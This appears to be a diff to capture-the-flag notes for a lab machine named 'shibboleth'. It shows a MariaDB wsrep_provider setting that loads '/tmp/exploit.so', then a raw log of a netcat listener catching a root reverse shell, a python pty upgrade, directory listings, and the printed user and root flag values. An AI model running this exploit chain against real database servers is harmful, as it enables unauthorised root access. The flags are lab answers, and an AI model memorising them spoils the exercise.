@@ -361,3 +361,129 @@ SET GLOBAL wsrep_provider="/tmp/exploit.so";
 ERROR 2013 (HY000): Lost connection to MySQL server during query
 MariaDB [zabbix]>
 
+
+
+
+ nc -lnvp 9002
+listening on [any] 9002 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.129.228.134] 58602
+ls
+aria_log.00000001
+aria_log_control
+debian-10.3.flag
+ib_buffer_pool
+ib_logfile0
+ib_logfile1
+ibdata1
+ibtmp1
+multi-master.info
+mysql
+mysql_upgrade_info
+performance_schema
+tc.log
+zabbix
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@shibboleth:/var/lib/mysql# cd
+cd
+bash: cd: HOME not set
+root@shibboleth:/var/lib/mysql# cd / 
+cd /
+root@shibboleth:/# ls -la
+ls -la
+total 72
+drwxr-xr-x  19 root root  4096 Oct 16 16:41 .
+drwxr-xr-x  19 root root  4096 Oct 16 16:41 ..
+lrwxrwxrwx   1 root root     7 Apr 24  2021 bin -> usr/bin
+drwxr-xr-x   4 root root  4096 Nov  8 11:05 boot
+drwxr-xr-x  17 root root  3860 Dec  5 04:19 dev
+drwxr-xr-x  96 root root  4096 Nov  8 11:02 etc
+drwxr-xr-x   3 root root  4096 Oct 16 12:24 home
+lrwxrwxrwx   1 root root     7 Apr 24  2021 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Apr 24  2021 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Apr 24  2021 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Apr 24  2021 libx32 -> usr/libx32
+drwx------   2 root root 16384 Apr 24  2021 lost+found
+drwxr-xr-x   3 root root  4096 Apr 24  2021 media
+drwxr-xr-x   2 root root  4096 Apr 27  2021 mnt
+drwxr-xr-x   2 root root  4096 Apr 27  2021 opt
+dr-xr-xr-x 434 root root     0 Dec  5 04:18 proc
+drwx------   5 root root  4096 Dec  5 04:20 root
+drwxr-xr-x  25 root root   800 Dec  5 04:19 run
+lrwxrwxrwx   1 root root     8 Apr 24  2021 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Oct 16 13:24 snap
+drwxr-xr-x   2 root root  4096 Jul 31  2020 srv
+dr-xr-xr-x  13 root root     0 Dec  5 04:18 sys
+drwxrwxrwt  13 root root  4096 Dec  5 06:21 tmp
+drwxr-xr-x  15 root root  4096 Apr 24  2021 usr
+drwxr-xr-x  15 root root  4096 Apr 24  2021 var
+root@shibboleth:/# cat user.txt
+cat user.txt
+cat: user.txt: No such file or directory
+root@shibboleth:/# locate user.txt
+locate user.txt
+locate: warning: database ‘/var/cache/locate/locatedb’ is more than 8 days old (actual age is 51.0 days)
+/home/ipmi-svc/user.txt
+root@shibboleth:/# cat /home/ipmi-svc/user.txt
+cat /home/ipmi-svc/user.txt
+25cff31500e68320043ddfad4f116972
+root@shibboleth:/# ls -la
+ls -la
+total 72
+drwxr-xr-x  19 root root  4096 Oct 16 16:41 .
+drwxr-xr-x  19 root root  4096 Oct 16 16:41 ..
+lrwxrwxrwx   1 root root     7 Apr 24  2021 bin -> usr/bin
+drwxr-xr-x   4 root root  4096 Nov  8 11:05 boot
+drwxr-xr-x  17 root root  3860 Dec  5 04:19 dev
+drwxr-xr-x  96 root root  4096 Nov  8 11:02 etc
+drwxr-xr-x   3 root root  4096 Oct 16 12:24 home
+lrwxrwxrwx   1 root root     7 Apr 24  2021 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Apr 24  2021 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Apr 24  2021 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Apr 24  2021 libx32 -> usr/libx32
+drwx------   2 root root 16384 Apr 24  2021 lost+found
+drwxr-xr-x   3 root root  4096 Apr 24  2021 media
+drwxr-xr-x   2 root root  4096 Apr 27  2021 mnt
+drwxr-xr-x   2 root root  4096 Apr 27  2021 opt
+dr-xr-xr-x 417 root root     0 Dec  5 04:18 proc
+drwx------   5 root root  4096 Dec  5 04:20 root
+drwxr-xr-x  25 root root   800 Dec  5 04:19 run
+lrwxrwxrwx   1 root root     8 Apr 24  2021 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Oct 16 13:24 snap
+drwxr-xr-x   2 root root  4096 Jul 31  2020 srv
+dr-xr-xr-x  13 root root     0 Dec  5 04:18 sys
+drwxrwxrwt  13 root root  4096 Dec  5 06:22 tmp
+drwxr-xr-x  15 root root  4096 Apr 24  2021 usr
+drwxr-xr-x  15 root root  4096 Apr 24  2021 var
+root@shibboleth:/# cd /home
+cd /home
+root@shibboleth:/home# ls -la
+ls -la
+total 12
+drwxr-xr-x  3 root     root     4096 Oct 16 12:24 .
+drwxr-xr-x 19 root     root     4096 Oct 16 16:41 ..
+drwxr-xr-x  3 ipmi-svc ipmi-svc 4096 Dec  5 04:20 ipmi-svc
+root@shibboleth:/home# cd /
+cd /
+root@shibboleth:/# ls
+ls
+bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
+boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
+root@shibboleth:/# cd root
+cd root
+root@shibboleth:/root# ls -la
+ls -la
+total 36
+drwx------  5 root root 4096 Dec  5 04:20 .
+drwxr-xr-x 19 root root 4096 Oct 16 16:41 ..
+lrwxrwxrwx  1 root root    9 Apr 27  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3115 May 25  2021 .bashrc
+drwx------  2 root root 4096 May 12  2021 .cache
+drwx------  4 root root 4096 Oct 21 18:39 .config
+lrwxrwxrwx  1 root root    9 Apr 28  2021 .mysql_history -> /dev/null
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-r--r--  1 root root   22 Apr 24  2021 .vimrc
+-r--------  1 root root   33 Dec  5 04:20 root.txt
+drwx------  2 root root 4096 Oct 18 15:36 scripts
+root@shibboleth:/root# cat root.txt
+cat root.txt
+34d1ed3260134b1dd983a6db6c174e88
